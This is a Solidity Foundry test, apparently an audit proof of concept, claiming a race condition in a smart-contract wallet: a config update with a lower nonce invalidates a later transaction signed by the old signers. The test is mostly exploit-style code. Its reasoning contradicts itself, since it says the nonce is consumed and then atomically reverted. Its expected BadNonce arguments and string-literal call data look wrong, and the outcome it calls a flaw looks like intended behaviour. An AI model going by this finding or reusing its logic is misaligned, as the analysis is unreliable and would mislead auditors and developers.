// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Nonce.sol";
import "../src/modules/Payload.sol";
import "../src/modules/Calls.sol";
import "../src/modules/auth/BaseAuth.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    // ATTACK TIMELINE:
    // 1. [Setup] Create Wallet with initial topology and fund it.
    // 2. [T=0] Attacker prepares Tx A (config update, lower nonce) and Tx B (regular op, higher nonce, signed by OLD config).
    // 3. [T=1] Tx A executes first due to lower nonce in the same space, updating the Wallet's imageHash.
    // 4. [T=2] Tx B attempts to execute. Since the config has changed, the old signers no longer have sufficient weight.
    // 5. [Assert] Tx B reverts with BadNonce (due to nonce consumption before validation and atomic revert), proving the temporal race condition at the config-update boundary.

    function test_exploit() public {
        // 1. Setup: Create Wallet with default topology
        string memory topology = _createDefaultTopology();
        (Stage1Module Wallet, string memory config, bytes32 imageHash) = _createWallet(topology);

        uint256 space = 1;
        uint256 nonce1 = 0;
        uint256 nonce2 = 1;

        // Fund the Wallet for gas/operations
        vm.deal(address(Wallet), 10 ether);

        // 2. Prepare Tx A: Configuration update (lower nonce)
        // We create a new imageHash to simulate a signer set change
        bytes32 newImageHash = keccak256("new_signer_set");

        Payload.Decoded memory payloadA = _buildPayload(nonce1);
        payloadA.space = space;
        payloadA.noChainId = false;
        payloadA.calls = new Payload.Call[](1);
        payloadA.calls[0].to = address(Wallet);
        payloadA.calls[0].value = 0;
        payloadA.calls[0].data = abi.encodeWithSelector(BaseAuth.updateImageHash.selector, newImageHash);

        // Sign Tx A with the current valid identity Wallet
        bytes memory signatureA = _validExplicitSignature(payloadA, identityWallet, config, topology, new uint8[](0));

        // 3. Prepare Tx B: Regular operation (higher nonce) signed by OLD signer set
        Payload.Decoded memory payloadB = _buildPayload(nonce2);
        payloadB.space = space;
        payloadB.noChainId = false;
        payloadB.calls = new Payload.Call[](1);
        payloadB.calls[0].to = address(mockTarget);
        payloadB.calls[0].value = 0;
        payloadB.calls[0].data = "0x12345678";

        // Sign Tx B with the session Wallet (which will be invalid after Tx A updates the config)
        bytes memory signatureB = _validExplicitSignature(payloadB, sessionWallet, config, topology, new uint8[](0));

        // 4. Execute Tx A first (lower nonce)
        // This updates the imageHash, invalidating the old signer set for subsequent transactions
        Wallet.execute(PrimitivesRPC.toPackedPayload(vm, payloadA), signatureA);

        // Verify the imageHash was updated
        assertEq(Stage2Auth(address(Wallet)).imageHash(), newImageHash, "Config should be updated");

        // 5. Execute Tx B (higher nonce)
        // Since the config changed, the old signers (sessionWallet) no longer have weight.
        // The nonce consumption before validation causes the transaction to revert atomically.
        // We expect a BadNonce revert because the nonce was consumed but the tx failed validation.
        vm.expectRevert(abi.encodeWithSelector(Nonce.BadNonce.selector, space, nonce2, nonce2 + 1));
        Wallet.execute(PrimitivesRPC.toPackedPayload(vm, payloadB), signatureB);
    }
}
